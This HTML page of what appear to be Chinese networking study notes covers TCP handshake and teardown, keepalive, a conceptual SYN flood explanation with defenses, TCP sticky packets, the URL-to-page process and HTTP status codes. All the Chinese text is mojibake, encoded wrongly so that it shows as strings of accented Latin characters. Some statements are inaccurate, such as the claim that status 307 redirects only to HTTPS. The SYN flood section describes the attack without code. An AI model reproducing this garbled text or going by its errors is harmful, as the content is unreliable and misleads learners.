<p>åœ¨å‡æƒ³çš„TCPå»ºç«‹çš„è¿æ¥æ—¶äºŒæ¬¡æ¡æ‰‹è¿‡ç¨‹ä¸­ï¼ŒClientå‘é€Serverå‘é€ä¸€ä¸ªSYNè¯·æ±‚å¸§ï¼ŒServeræ”¶åˆ°åå‘é€äº†ç¡®è®¤åº”ç­”SYN+ACKå¸§ã€‚æŒ‰ç…§ä¸¤æ¬¡æ¡æ‰‹çš„åå®šï¼ŒServerè®¤ä¸ºè¿æ¥å·²ç»æˆåŠŸåœ°å»ºç«‹äº†ï¼Œå¯ä»¥å¼€å§‹å‘é€æ•°æ®å¸§ã€‚è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œå¦‚æœç¡®è®¤åº”ç­”SYN+ACKå¸§åœ¨ä¼ è¾“ä¸­è¢«ä¸¢å¤±ï¼ŒClientæ²¡æœ‰æ”¶åˆ°ï¼ŒClientå°†ä¸çŸ¥é“Serveræ˜¯å¦å·²å‡†å¤‡å¥½ï¼Œä¹Ÿä¸çŸ¥é“Serverçš„SNåºåˆ—å·ï¼ŒClientè®¤ä¸ºè¿æ¥è¿˜æœªå»ºç«‹æˆåŠŸï¼Œå°†å¿½ç•¥Serverå‘æ¥çš„ä»»ä½•æ•°æ®åˆ†ç»„ï¼Œä¼šä¸€ç›´ç­‰å¾…Serverçš„SYN+ACKç¡®è®¤åº”ç­”å¸§ã€‚è€ŒServeråœ¨å‘å‡ºçš„æ•°æ®å¸§åï¼Œä¸€ç›´æ²¡æœ‰æ”¶åˆ°å¯¹åº”çš„ACKç¡®è®¤åå°±ä¼šäº§ç”Ÿè¶…æ—¶ï¼Œé‡å¤å‘é€åŒæ ·çš„æ•°æ®å¸§ã€‚è¿™æ ·å°±å½¢æˆäº†æ­»é”ã€‚</p>
<h3 id="ä¸ºä»€ä¹ˆä¸»åŠ¨æ–­å¼€æ–¹åœ¨TIME-WAITçŠ¶æ€å¿…é¡»ç­‰å¾…2MSLçš„æ—¶é—´ï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆä¸»åŠ¨æ–­å¼€æ–¹åœ¨TIME-WAITçŠ¶æ€å¿…é¡»ç­‰å¾…2MSLçš„æ—¶é—´ï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆä¸»åŠ¨æ–­å¼€æ–¹åœ¨TIME-WAITçŠ¶æ€å¿…é¡»ç­‰å¾…2MSLçš„æ—¶é—´ï¼Ÿ"></a>ä¸ºä»€ä¹ˆä¸»åŠ¨æ–­å¼€æ–¹åœ¨TIME-WAITçŠ¶æ€å¿…é¡»ç­‰å¾…2MSLçš„æ—¶é—´ï¼Ÿ</h3><p>åŸå› ä¹‹ä¸€ï¼šä¸»åŠ¨æ–­å¼€æ–¹ç­‰å¾…2MSLçš„æ—¶é—´ï¼Œæ˜¯ä¸ºäº†ç¡®ä¿ä¸¤ç«¯éƒ½èƒ½æœ€ç»ˆå…³é—­ã€‚å‡è®¾ç½‘ç»œæ˜¯ä¸å¯é çš„ï¼Œè¢«åŠ¨æ–­å¼€æ–¹å‘é€FIN+ACKæŠ¥æ–‡åï¼Œå…¶ä¸»åŠ¨æ–¹çš„ACKå“åº”æŠ¥æ–‡æœ‰å¯èƒ½ä¸¢å¤±ï¼Œè¿™æ—¶å€™çš„è¢«åŠ¨æ–­å¼€æ–¹å¤„äºLAST-ACKçŠ¶æ€çš„ï¼Œç”±äºæ”¶ä¸åˆ°ACKç¡®è®¤è¢«åŠ¨æ–¹ä¸€ç›´ä¸èƒ½æ­£å¸¸çš„è¿›å…¥CLOSEDçŠ¶æ€ã€‚åœ¨è¿™ç§åœºæ™¯ä¸‹ï¼Œè¢«åŠ¨æ–­å¼€æ–¹ä¼šè¶…æ—¶é‡ä¼ FIN+ACKæ–­å¼€å“åº”æŠ¥æ–‡ï¼Œå¦‚æœä¸»åŠ¨æ–­å¼€æ–¹åœ¨2MSLæ—¶é—´å†…ï¼Œæ”¶åˆ°è¿™ä¸ªé‡ä¼ çš„FIN+ACKæŠ¥æ–‡ï¼Œä¼šé‡ä¼ ä¸€æ¬¡ACKæŠ¥æ–‡ï¼Œåå†ä¸€æ¬¡é‡æ–°å¯åŠ¨2MSLè®¡æ—¶ç­‰å¾…ï¼Œè¿™æ ·ï¼Œå°±èƒ½ç¡®ä¿è¢«åŠ¨æ–­å¼€æ–¹èƒ½æ”¶åˆ°ACKæŠ¥æ–‡ï¼Œä»è€Œèƒ½ç¡®ä¿è¢«åŠ¨æ–¹é¡ºåˆ©è¿›å…¥åˆ°CLOSEDçŠ¶æ€ã€‚åªæœ‰è¿™æ ·ï¼ŒåŒæ–¹éƒ½èƒ½å¤Ÿç¡®ä¿å…³é—­ã€‚åè¿‡æ¥è¯´ï¼Œå¦‚æœä¸»åŠ¨æ–­å¼€æ–¹åœ¨å‘é€å®ŒACKå“åº”æŠ¥æ–‡åï¼Œä¸æ˜¯è¿›å…¥TIME_WAITçŠ¶æ€å»ç­‰å¾…2MSLæ—¶é—´ï¼Œè€Œæ˜¯ç«‹å³é‡Šæ”¾è¿æ¥ï¼Œåˆ™å°†æ— æ³•æ”¶åˆ°è¢«åŠ¨æ–¹é‡ä¼ çš„FIN+ACKæŠ¥æ–‡ï¼Œæ‰€ä»¥ä¸ä¼šå†å‘é€ä¸€æ¬¡ACKç¡®è®¤æŠ¥æ–‡ï¼Œæ­¤æ—¶å¤„äºLAST-ACKçŠ¶æ€çš„è¢«åŠ¨æ–­å¼€æ–¹ï¼Œæ— æ³•æ­£å¸¸è¿›å…¥åˆ°CLOSEDçŠ¶æ€ã€‚</p>
<p>åŸå› ä¹‹äºŒï¼šé˜²æ­¢â€œæ—§è¿æ¥çš„å·²å¤±æ•ˆçš„æ•°æ®æŠ¥æ–‡â€å‡ºç°åœ¨æ–°è¿æ¥ä¸­ã€‚ä¸»åŠ¨æ–­å¼€æ–¹åœ¨å‘é€å®Œæœ€åä¸€ä¸ªACKæŠ¥æ–‡åï¼Œå†ç»è¿‡2MSLï¼Œæ‰èƒ½æœ€ç»ˆå…³é—­å’Œé‡Šæ”¾ç«¯å£ï¼Œè¿™å°±æ„å‘³ç€ï¼Œç›¸åŒç«¯å£çš„æ–°TCPæ–°è¿æ¥ï¼Œéœ€è¦åœ¨2MSLçš„æ—¶é—´ä¹‹åï¼Œæ‰èƒ½å¤Ÿæ­£å¸¸çš„å»ºç«‹ã€‚2MSLè¿™æ®µæ—¶é—´å†…ï¼Œæ—§è¿æ¥æ‰€äº§ç”Ÿçš„æ‰€æœ‰æ•°æ®æŠ¥æ–‡ï¼Œéƒ½å·²ç»ä»ç½‘ç»œä¸­æ¶ˆå¤±äº†ï¼Œä»è€Œï¼Œç¡®ä¿äº†ä¸‹ä¸€ä¸ªæ–°çš„è¿æ¥ä¸­ä¸ä¼šå‡ºç°è¿™ç§æ—§è¿æ¥è¯·æ±‚æŠ¥æ–‡ã€‚</p>
<h3 id="å¦‚æœå·²ç»å»ºç«‹äº†è¿æ¥ï¼Œä½†æ˜¯Clientç«¯çªç„¶å‡ºç°æ•…éšœäº†æ€ä¹ˆåŠï¼Ÿ"><a href="#å¦‚æœå·²ç»å»ºç«‹äº†è¿æ¥ï¼Œä½†æ˜¯Clientç«¯çªç„¶å‡ºç°æ•…éšœäº†æ€ä¹ˆåŠï¼Ÿ" class="headerlink" title="å¦‚æœå·²ç»å»ºç«‹äº†è¿æ¥ï¼Œä½†æ˜¯Clientç«¯çªç„¶å‡ºç°æ•…éšœäº†æ€ä¹ˆåŠï¼Ÿ"></a>å¦‚æœå·²ç»å»ºç«‹äº†è¿æ¥ï¼Œä½†æ˜¯Clientç«¯çªç„¶å‡ºç°æ•…éšœäº†æ€ä¹ˆåŠï¼Ÿ</h3><p>TCPè¿˜è®¾æœ‰ä¸€ä¸ªä¿æ´»è®¡æ—¶å™¨ï¼ŒClientç«¯å¦‚æœå‡ºç°æ•…éšœï¼ŒServerç«¯ä¸èƒ½ä¸€ç›´ç­‰ä¸‹å»ï¼Œè¿™æ ·ä¼šæµªè´¹ç³»ç»Ÿèµ„æºã€‚æ¯æ”¶åˆ°ä¸€æ¬¡Clientå®¢æˆ·ç«¯çš„æ•°æ®å¸§åï¼ŒServerç«¯çš„ä¿æ´»è®¡æ—¶å™¨ä¼šå¤ä½ã€‚è®¡æ—¶å™¨çš„è¶…æ—¶æ—¶é—´é€šå¸¸æ˜¯è®¾ç½®ä¸º2å°æ—¶ï¼Œè‹¥2å°æ—¶è¿˜æ²¡æœ‰æ”¶åˆ°Clientç«¯çš„ä»»ä½•æ•°æ®å¸§ï¼ŒServerç«¯å°±ä¼šå‘é€ä¸€ä¸ªæ¢æµ‹æŠ¥æ–‡æ®µï¼Œä»¥åæ¯éš”75ç§’é’Ÿå‘é€ä¸€æ¬¡ã€‚è‹¥ä¸€è¿å‘é€10ä¸ªæ¢æµ‹æŠ¥æ–‡ä»ç„¶æ²¡ååº”ï¼ŒServerç«¯å°±è®¤ä¸ºClientç«¯å‡ºäº†æ•…éšœï¼Œæ¥ç€å°±å…³é—­è¿æ¥ã€‚å¦‚æœè§‰å¾—ä¿æ´»è®¡æ—¶å™¨çš„ä¸¤ä¸ªå¤šå°æ—¶çš„é—´éš”å¤ªé•¿ï¼Œå¯ä»¥è‡ªè¡Œè°ƒæ•´TCPè¿æ¥çš„ä¿æ´»å‚æ•°ã€‚</p>
<h3 id="Synæ´ªæ³›æ”»å‡»"><a href="#Synæ´ªæ³›æ”»å‡»" class="headerlink" title="Synæ´ªæ³›æ”»å‡»"></a>Synæ´ªæ³›æ”»å‡»</h3><p>Aï¼ˆæ”»å‡»è€…ï¼‰å‘é€TCP SYNï¼ŒSYNæ˜¯TCPä¸‰æ¬¡æ¡æ‰‹ä¸­çš„ç¬¬ä¸€ä¸ªæ•°æ®åŒ…ï¼Œè€Œå½“è¿™ä¸ªæœåŠ¡å™¨è¿”å›ACKä»¥åï¼ŒAä¸å†è¿›è¡Œç¡®è®¤ï¼Œé‚£è¿™ä¸ªè¿æ¥å°±å¤„åœ¨äº†ä¸€ä¸ªæŒ‚èµ·çš„çŠ¶æ€ï¼Œä¹Ÿå°±æ˜¯åŠè¿æ¥çš„æ„æ€ï¼Œé‚£ä¹ˆæœåŠ¡å™¨æ”¶ä¸åˆ°å†ç¡®è®¤çš„ä¸€ä¸ªæ¶ˆæ¯ï¼Œè¿˜ä¼šé‡å¤å‘é€ACKç»™Aã€‚è¿™æ ·ä¸€æ¥å°±ä¼šæ›´åŠ æµªè´¹æœåŠ¡å™¨çš„èµ„æºã€‚Aå°±å¯¹æœåŠ¡å™¨å‘é€éæ³•å¤§é‡çš„è¿™ç§TCPè¿æ¥ï¼Œç”±äºæ¯ä¸€ä¸ªéƒ½æ²¡æ³•å®Œæˆæ¡æ‰‹çš„æœºåˆ¶ï¼Œæ‰€ä»¥å®ƒå°±ä¼šæ¶ˆè€—æœåŠ¡å™¨çš„å†…å­˜æœ€åå¯èƒ½å¯¼è‡´æœåŠ¡å™¨æ­»æœºï¼Œå°±æ— æ³•æ­£å¸¸å·¥ä½œäº†ã€‚æ›´è¿›ä¸€æ­¥è¯´ï¼Œå¦‚æœè¿™äº›åŠè¿æ¥çš„æ¡æ‰‹è¯·æ±‚æ˜¯æ¶æ„ç¨‹åºå‘å‡ºï¼Œå¹¶ä¸”æŒç»­ä¸æ–­ï¼Œé‚£ä¹ˆå°±ä¼šå¯¼è‡´æœåŠ¡ç«¯è¾ƒé•¿æ—¶é—´å†…ä¸§å¤±æœåŠ¡åŠŸèƒ½â€”â€”è¿™æ ·å°±å½¢æˆäº†DoSæ”»å‡»ã€‚è¿™ç§æ”»å‡»æ–¹å¼å°±ç§°ä¸ºSYNæ³›æ´ªæ”»å‡»ã€‚</p>
<p>é‚£ä¹ˆæˆ‘ä»¬å¦‚ä½•å»é˜²èŒƒè¿™ç§SYNæ”»å‡»å‘¢ï¼Ÿ</p>
<p>å…¶å®æœ€å¸¸ç”¨çš„ä¸€ä¸ªæ‰‹æ®µå°±æ˜¯ä¼˜åŒ–ä¸»æœºç³»ç»Ÿè®¾ç½®ã€‚æ¯”å¦‚é™ä½SYN timeoutæ—¶é—´ï¼Œä½¿å¾—ä¸»æœºå°½å¿«é‡Šæ”¾åŠè¿æ¥çš„å ç”¨æˆ–è€…é‡‡ç”¨SYN cookieè®¾ç½®ï¼Œå¦‚æœçŸ­æ—¶é—´å†…æ”¶åˆ°äº†æŸä¸ªIPçš„é‡å¤SYNè¯·æ±‚ï¼Œæˆ‘ä»¬å°±è®¤ä¸ºå—åˆ°äº†æ”»å‡»ã€‚æˆ‘ä»¬åˆç†çš„é‡‡ç”¨é˜²ç«å¢™è®¾ç½®ç­‰å¤–éƒ¨ç½‘ç»œä¹Ÿå¯ä»¥è¿›è¡Œæ‹¦æˆªã€‚</p>
<h2 id="ä»€ä¹ˆæ˜¯ç²˜åŒ…å’ŒåŠåŒ…ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯ç²˜åŒ…å’ŒåŠåŒ…ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯ç²˜åŒ…å’ŒåŠåŒ…ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯ç²˜åŒ…å’ŒåŠåŒ…ï¼Ÿ</h2><p>åŠåŒ…æ˜¯æŒ‡åªæ”¶åˆ°äº†å…¨åŒ…çš„ä¸€éƒ¨åˆ†.</p>
<p>åœ¨è¿›è¡Œ Java NIO å­¦ä¹ æ—¶ï¼Œå¯èƒ½ä¼šå‘ç°ï¼šå¦‚æœå®¢æˆ·ç«¯è¿ç»­ä¸æ–­çš„å‘æœåŠ¡ç«¯å‘é€æ•°æ®åŒ…æ—¶ï¼ŒæœåŠ¡ç«¯æ¥æ”¶çš„æ•°æ®ä¼šå‡ºç°ä¸¤ä¸ªæ•°æ®åŒ…ç²˜åœ¨ä¸€èµ·çš„æƒ…å†µã€‚</p>
<ol>
<li><p>TCPæ˜¯åŸºäºå­—èŠ‚æµçš„ï¼Œè™½ç„¶åº”ç”¨å±‚å’Œ TCP ä¼ è¾“å±‚ä¹‹é—´çš„æ•°æ®äº¤äº’æ˜¯å¤§å°ä¸ç­‰çš„æ•°æ®å—ï¼Œä½†æ˜¯TCPæŠŠè¿™äº›æ•°æ®å—ä»…ä»…çœ‹æˆä¸€è¿ä¸²æ— ç»“æ„çš„å­—èŠ‚æµï¼Œæ²¡æœ‰è¾¹ç•Œï¼›</p>
</li>
<li><p>ä»TCPçš„å¸§ç»“æ„ä¹Ÿå¯ä»¥çœ‹å‡ºï¼Œåœ¨TCPçš„é¦–éƒ¨æ²¡æœ‰è¡¨ç¤ºæ•°æ®é•¿åº¦çš„å­—æ®µã€‚</p>
</li>
</ol>
<p>åŸºäºä¸Šé¢ä¸¤ç‚¹ï¼Œåœ¨ä½¿ç”¨TCPä¼ è¾“æ•°æ®æ—¶ï¼Œæ‰æœ‰ç²˜åŒ…æˆ–è€…æ‹†åŒ…ç°è±¡å‘ç”Ÿçš„å¯èƒ½ã€‚ä¸€ä¸ªæ•°æ®åŒ…ä¸­åŒ…å«äº†å‘é€ç«¯å‘é€çš„ä¸¤ä¸ªæ•°æ®åŒ…çš„ä¿¡æ¯ï¼Œè¿™ç§ç°è±¡å³ä¸ºç²˜åŒ…ã€‚</p>
<p>æ¥æ”¶ç«¯æ”¶åˆ°äº†ä¸¤ä¸ªæ•°æ®åŒ…ï¼Œä½†æ˜¯è¿™ä¸¤ä¸ªæ•°æ®åŒ…è¦ä¹ˆæ˜¯ä¸å®Œæ•´çš„ï¼Œè¦ä¹ˆå°±æ˜¯å¤šå‡ºæ¥ä¸€å—ï¼Œè¿™ç§æƒ…å†µå³å‘ç”Ÿäº†æ‹†åŒ…å’Œç²˜åŒ…ã€‚æ‹†åŒ…å’Œç²˜åŒ…çš„é—®é¢˜å¯¼è‡´æ¥æ”¶ç«¯åœ¨å¤„ç†çš„æ—¶å€™ä¼šéå¸¸å›°éš¾ï¼Œå› ä¸ºæ— æ³•åŒºåˆ†ä¸€ä¸ªå®Œæ•´çš„æ•°æ®åŒ…ã€‚</p>
<h2 id="TCP-ç²˜åŒ…æ˜¯æ€ä¹ˆäº§ç”Ÿçš„ï¼Ÿ"><a href="#TCP-ç²˜åŒ…æ˜¯æ€ä¹ˆäº§ç”Ÿçš„ï¼Ÿ" class="headerlink" title="TCP ç²˜åŒ…æ˜¯æ€ä¹ˆäº§ç”Ÿçš„ï¼Ÿ"></a>TCP ç²˜åŒ…æ˜¯æ€ä¹ˆäº§ç”Ÿçš„ï¼Ÿ</h2><ul>
<li><strong>å‘é€æ–¹äº§ç”Ÿç²˜åŒ…</strong></li>
</ul>
<p>é‡‡ç”¨ TCP åè®®ä¼ è¾“æ•°æ®çš„å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨ç»å¸¸æ˜¯ä¿æŒä¸€ä¸ªé•¿è¿æ¥çš„çŠ¶æ€ï¼ˆä¸€æ¬¡è¿æ¥å‘ä¸€æ¬¡æ•°æ®ä¸å­˜åœ¨ç²˜åŒ…ï¼‰ï¼ŒåŒæ–¹åœ¨è¿æ¥ä¸æ–­å¼€çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥ä¸€ç›´ä¼ è¾“æ•°æ®ã€‚ä½†å½“å‘é€çš„æ•°æ®åŒ…è¿‡äºçš„å°æ—¶ï¼Œé‚£ä¹ˆ TCP åè®®é»˜è®¤çš„ä¼šå¯ç”¨ Nagle ç®—æ³•ï¼Œå°†è¿™äº›è¾ƒå°çš„æ•°æ®åŒ…è¿›è¡Œåˆå¹¶å‘é€ï¼ˆç¼“å†²åŒºæ•°æ®å‘é€æ˜¯ä¸€ä¸ªå †å‹çš„è¿‡ç¨‹ï¼‰ï¼›è¿™ä¸ªåˆå¹¶è¿‡ç¨‹å°±æ˜¯åœ¨å‘é€ç¼“å†²åŒºä¸­è¿›è¡Œçš„ï¼Œä¹Ÿå°±æ˜¯è¯´æ•°æ®å‘é€å‡ºæ¥å®ƒå·²ç»æ˜¯ç²˜åŒ…çš„çŠ¶æ€äº†ã€‚</p>
<ul>
<li><strong>æ¥æ”¶æ–¹äº§ç”Ÿç²˜åŒ…</strong></li>
</ul>
<p>æ¥æ”¶æ–¹é‡‡ç”¨ TCP åè®®æ¥æ”¶æ•°æ®æ—¶çš„è¿‡ç¨‹æ˜¯è¿™æ ·çš„ï¼šæ•°æ®åˆ°æ¥æ”¶æ–¹ï¼Œä»ç½‘ç»œæ¨¡å‹çš„ä¸‹æ–¹ä¼ é€’è‡³ä¼ è¾“å±‚ï¼Œä¼ è¾“å±‚çš„ TCP åè®®å¤„ç†æ˜¯å°†å…¶æ”¾ç½®æ¥æ”¶ç¼“å†²åŒºï¼Œç„¶åç”±åº”ç”¨å±‚æ¥ä¸»åŠ¨è·å–ï¼ˆC è¯­è¨€ç”¨ recvã€read ç­‰å‡½æ•°ï¼‰ï¼›è¿™æ—¶ä¼šå‡ºç°ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯æˆ‘ä»¬åœ¨ç¨‹åºä¸­è°ƒç”¨çš„è¯»å–æ•°æ®å‡½æ•°ä¸èƒ½åŠæ—¶çš„æŠŠç¼“å†²åŒºä¸­çš„æ•°æ®æ‹¿å‡ºæ¥ï¼Œè€Œä¸‹ä¸€ä¸ªæ•°æ®åˆåˆ°æ¥å¹¶æœ‰ä¸€éƒ¨åˆ†æ”¾å…¥çš„ç¼“å†²åŒºæœ«å°¾ï¼Œç­‰æˆ‘ä»¬è¯»å–æ•°æ®æ—¶å°±æ˜¯ä¸€ä¸ªç²˜åŒ…ã€‚ï¼ˆæ”¾æ•°æ®çš„é€Ÿåº¦ &gt; åº”ç”¨å±‚æ‹¿æ•°æ®é€Ÿåº¦ï¼‰</p>
<h2 id="æ€ä¹ˆè§£å†³æ‹†åŒ…å’Œç²˜åŒ…ï¼Ÿ"><a href="#æ€ä¹ˆè§£å†³æ‹†åŒ…å’Œç²˜åŒ…ï¼Ÿ" class="headerlink" title="æ€ä¹ˆè§£å†³æ‹†åŒ…å’Œç²˜åŒ…ï¼Ÿ"></a>æ€ä¹ˆè§£å†³æ‹†åŒ…å’Œç²˜åŒ…ï¼Ÿ</h2><p>åˆ†åŒ…æœºåˆ¶ä¸€èˆ¬æœ‰ä¸¤ä¸ªé€šç”¨çš„è§£å†³æ–¹æ³•ï¼š</p>
<ol>
<li><p>ç‰¹æ®Šå­—ç¬¦æ§åˆ¶ï¼›</p>
</li>
<li><p>åœ¨åŒ…å¤´é¦–éƒ½æ·»åŠ æ•°æ®åŒ…çš„é•¿åº¦ã€‚</p>
</li>
</ol>
<p>å¦‚æœä½¿ç”¨ netty çš„è¯ï¼Œå°±æœ‰ä¸“é—¨çš„ç¼–ç å™¨å’Œè§£ç å™¨è§£å†³æ‹†åŒ…å’Œç²˜åŒ…é—®é¢˜äº†ã€‚</p>
<p>tipsï¼šUDP æ²¡æœ‰ç²˜åŒ…é—®é¢˜ï¼Œä½†æ˜¯æœ‰ä¸¢åŒ…å’Œä¹±åºã€‚ä¸å®Œæ•´çš„åŒ…æ˜¯ä¸ä¼šæœ‰çš„ï¼Œæ”¶åˆ°çš„éƒ½æ˜¯å®Œå…¨æ­£ç¡®çš„åŒ…ã€‚ä¼ é€çš„æ•°æ®å•ä½åè®®æ˜¯ UDP æŠ¥æ–‡æˆ–ç”¨æˆ·æ•°æ®æŠ¥ï¼Œå‘é€çš„æ—¶å€™æ—¢ä¸åˆå¹¶ï¼Œä¹Ÿä¸æ‹†åˆ†ã€‚</p>
<h2 id="åœ¨æµè§ˆå™¨ä¸­è¾“å…¥urlåœ°å€-gt-gt-æ˜¾ç¤ºä¸»é¡µçš„è¿‡ç¨‹"><a href="#åœ¨æµè§ˆå™¨ä¸­è¾“å…¥urlåœ°å€-gt-gt-æ˜¾ç¤ºä¸»é¡µçš„è¿‡ç¨‹" class="headerlink" title="åœ¨æµè§ˆå™¨ä¸­è¾“å…¥urlåœ°å€ -&gt;&gt; æ˜¾ç¤ºä¸»é¡µçš„è¿‡ç¨‹"></a>åœ¨æµè§ˆå™¨ä¸­è¾“å…¥urlåœ°å€ -&gt;&gt; æ˜¾ç¤ºä¸»é¡µçš„è¿‡ç¨‹</h2><p>å›¾è§£ï¼ˆå›¾ç‰‡æ¥æºï¼šã€Šå›¾è§£HTTPã€‹ï¼‰ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848898.jpg" alt="img"></p>
<blockquote>
<p>ä¸Šå›¾æœ‰ä¸€ä¸ªé”™è¯¯ï¼Œè¯·æ³¨æ„ï¼Œæ˜¯OSPFä¸æ˜¯OPSFã€‚ OSPFï¼ˆOpen Shortest Path Firstï¼Œospfï¼‰å¼€æ”¾æœ€çŸ­è·¯å¾„ä¼˜å…ˆåè®®,æ˜¯ç”±Internetå·¥ç¨‹ä»»åŠ¡ç»„å¼€å‘çš„è·¯ç”±é€‰æ‹©åè®®</p>
</blockquote>
<p>æ€»ä½“æ¥è¯´åˆ†ä¸ºä»¥ä¸‹å‡ ä¸ªè¿‡ç¨‹:</p>
<ol>
<li>DNSè§£æ</li>
<li>TCPè¿æ¥</li>
<li>å‘é€HTTPè¯·æ±‚</li>
<li>æœåŠ¡å™¨å¤„ç†è¯·æ±‚å¹¶è¿”å›HTTPæŠ¥æ–‡</li>
<li>æµè§ˆå™¨è§£ææ¸²æŸ“é¡µé¢</li>
<li>è¿æ¥ç»“æŸ</li>
</ol>
<h5 id="DNSè´Ÿè½½å‡è¡¡CDNæŠ€æœ¯"><a href="#DNSè´Ÿè½½å‡è¡¡CDNæŠ€æœ¯" class="headerlink" title="DNSè´Ÿè½½å‡è¡¡CDNæŠ€æœ¯"></a>DNSè´Ÿè½½å‡è¡¡CDNæŠ€æœ¯</h5><p>DNSè¿”å›çš„IPåœ°å€æ˜¯å¦æ¯æ¬¡éƒ½ä¸€æ ·ï¼Ÿå¦‚æœæ¯æ¬¡éƒ½ä¸€æ ·æ˜¯å¦è¯´æ˜ä½ è¯·æ±‚çš„èµ„æºéƒ½ä½äºåŒä¸€å°æœºå™¨ä¸Šé¢ï¼Œé‚£ä¹ˆè¿™å°æœºå™¨éœ€è¦å¤šé«˜çš„æ€§èƒ½å’Œå‚¨å­˜æ‰èƒ½æ»¡è¶³äº¿ä¸‡è¯·æ±‚å‘¢ï¼Ÿå…¶å®çœŸå®çš„äº’è”ç½‘ä¸–ç•ŒèƒŒåå­˜åœ¨æˆåƒä¸Šç™¾å°æœåŠ¡å™¨ï¼Œå¤§å‹çš„ç½‘ç«™ç”šè‡³æ›´å¤šã€‚ä½†æ˜¯åœ¨ç”¨æˆ·çš„çœ¼ä¸­ï¼Œå®ƒéœ€è¦çš„åªæ˜¯å¤„ç†ä»–çš„è¯·æ±‚ï¼Œå“ªå°æœºå™¨å¤„ç†è¯·æ±‚å¹¶ä¸é‡è¦ã€‚DNSå¯ä»¥è¿”å›ä¸€ä¸ªåˆé€‚çš„æœºå™¨çš„IPç»™ç”¨æˆ·ï¼Œä¾‹å¦‚å¯ä»¥æ ¹æ®æ¯å°æœºå™¨çš„è´Ÿè½½é‡ï¼Œè¯¥æœºå™¨ç¦»ç”¨æˆ·åœ°ç†ä½ç½®çš„è·ç¦»ç­‰ç­‰ï¼Œè¿™ç§è¿‡ç¨‹å°±æ˜¯DNSè´Ÿè½½å‡è¡¡ï¼Œåˆå«åšDNSé‡å®šå‘ã€‚å¤§å®¶è€³ç†Ÿèƒ½è¯¦çš„CDN(Content Delivery Network)å°±æ˜¯åˆ©ç”¨DNSçš„é‡å®šå‘æŠ€æœ¯ï¼ŒDNSæœåŠ¡å™¨ä¼šè¿”å›ä¸€ä¸ªè·Ÿç”¨æˆ·æœ€æ¥è¿‘çš„ç‚¹çš„IPåœ°å€ç»™ç”¨æˆ·ï¼ŒCDNèŠ‚ç‚¹çš„æœåŠ¡å™¨è´Ÿè´£å“åº”ç”¨æˆ·çš„è¯·æ±‚ï¼Œæä¾›æ‰€éœ€çš„å†…å®¹ã€‚åœ¨è¿™é‡Œæ‰“ä¸ªå…è´¹çš„å¹¿å‘Šï¼Œæˆ‘å¹³æ—¶ä½¿ç”¨çš„æ¯”è¾ƒå¤šçš„æ˜¯ä¸ƒç‰›äº‘çš„CDN(å…è´¹)å‚¨å­˜å›¾ç‰‡ï¼Œä½œä¸ºæˆ‘ä¸ªäººåšå®¢çš„å›¾åºŠä½¿ç”¨</p>
<p>å…·ä½“å¯ä»¥å‚è€ƒä¸‹é¢è¿™ç¯‡æ–‡ç« ï¼š</p>
<ul>
<li><a href="https://segmentfault.com/a/1190000006879700">https://segmentfault.com/a/1190000006879700</a></li>
</ul>
<h2 id="HTTPçŠ¶æ€ç "><a href="#HTTPçŠ¶æ€ç " class="headerlink" title="HTTPçŠ¶æ€ç "></a>HTTPçŠ¶æ€ç </h2><p>200ï¼š è¯·æ±‚è¢«æœåŠ¡å™¨ç«¯æ­£å¸¸å¤„ç†</p>
<p>204 no contentï¼šæœåŠ¡å™¨ç«¯å·²æˆåŠŸå¤„ç†è¯·æ±‚ï¼Œä½†æ˜¯åœ¨è¿”å›çš„å“åº”æŠ¥æ–‡ä¸­ä¸å«å®ä½“çš„ä¸»ä½“å†…å®¹ã€‚æµè§ˆå™¨æ˜¾ç¤ºçš„é¡µé¢ä¸å‘ç”Ÿæ›´æ–°ã€‚</p>
<p>206 partial contentï¼šè¡¨ç¤ºæœåŠ¡å™¨ç«¯æˆåŠŸæ‰§è¡Œäº†èŒƒå›´è¯·æ±‚ï¼Œå“åº”æŠ¥æ–‡ä¸­åŒ…å«ç”± Content-Range æŒ‡å®šèŒƒå›´çš„å®ä½“å†…å®¹ã€‚</p>
<p>3XX å“åº”ç»“æœè¡¨æ˜æµè§ˆå™¨éœ€è¦æ‰§è¡ŒæŸäº›ç‰¹æ®Šçš„å¤„ç†ä»¥æ­£ç¡®å¤„ç†è¯·æ±‚ã€‚</p>
<p>301ï¼šæ°¸ä¹…æ€§é‡å®šå‘ã€‚</p>
<p>302ï¼šä¸´æ—¶æ€§é‡å®šå‘ã€‚</p>
<p>303ï¼šè¡¨ç¤ºè¯¥è¯·æ±‚å¯¹åº”çš„èµ„æºå­˜åœ¨ç€å¦ä¸€ä¸ªURIï¼Œåº”ä½¿ç”¨ get æ–¹æ³•å®šå‘è·å–è¯·æ±‚çš„èµ„æºã€‚</p>
<p>307: åªèƒ½é‡å®šå‘åˆ°https</p>
<p>4XX å®¢æˆ·ç«¯é”™è¯¯</p>
<p>400ï¼šå®¢æˆ·ç«¯è¯·æ±‚æŠ¥æ–‡ä¸­å­˜åœ¨è¯­æ³•é”™è¯¯</p>
<p>401ï¼šéœ€è¦è®¤è¯ä¿¡æ¯æˆ–è®¤è¯å¤±è´¥ã€‚ç¬¬ä¸€æ¬¡è¿”å›è¡¨ç¤ºéœ€è¦è®¤è¯ä¿¡æ¯ï¼Œç¬¬äºŒæ¬¡è¡¨ç¤ºè®¤è¯å¤±è´¥ã€‚</p>
<p>403ï¼šç¦æ­¢è®¿é—®ï¼Œæ²¡æœ‰è®¿é—®æƒé™ã€‚çœ‹è§†é¢‘+åšå®¢</p>
<p>404ï¼šæœåŠ¡å™¨ç«¯æ²¡æœ‰æ‰¾åˆ°è¯·æ±‚èµ„æº</p>
<p>5XX æœåŠ¡å™¨é”™è¯¯</p>
<p>500 ï¼šæœåŠ¡å™¨å¤„ç†è¯·æ±‚å‘ç”Ÿé”™è¯¯</p>
<p>502 : ç½‘å…³é”™è¯¯</p>
